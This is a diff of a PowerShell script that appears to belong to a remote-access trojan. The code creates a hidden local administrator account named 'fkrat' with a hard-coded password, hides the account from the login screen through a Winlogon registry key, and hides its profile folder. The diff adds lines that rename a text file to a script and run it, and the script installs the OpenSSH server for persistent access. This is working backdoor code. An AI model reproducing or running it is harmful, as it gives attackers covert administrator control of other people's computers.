@@ -26,18 +26,10 @@ function createAdmin {
 ## variables
 $temp = "$env:temp"
 $dirName = randomText
-
 $uName = "fkrat"
 $pWord = (ConvertTo-SecureString  "FindersKeepers" -AsPlainText -Force)
-
 $rPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"
-
 $group = (((New-Object System.Security.Principal.SecurityIdentifier('S-1-5-32-544')).Translate([System.Security.Principal.NTAccount]).Value) -Split "\\")[1]
-
-## goto Temp and start 
-Set-Location $temp	
-New-Item -Path $temp -Name $dirName -Type Directory
-Set-Location $dirName
 
 ## Create Admin
 createAdmin -uName $uName -pWord $pWord
@@ -46,6 +38,14 @@ createAdmin -uName $uName -pWord $pWord
 New-Item -Path $rPath -Force
 New-ItemProperty -Path $rPath -Name $uName -Value 00000000
 Get-Item "C:\Users\$uName" -Force | ForEach-Object {$_.Attributes = $_.Attributes -bor "Hidden"}
+
+## goto Temp and make dir 
+Set-Location $temp	
+New-Item -Path $temp -Name $dirName -Type Directory
+Set-Location $dirName
+
+Move-Item smtp.txt smtp.ps1
+Start-Process smtp.ps1
 
 ## Enable persistent SSH
 Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
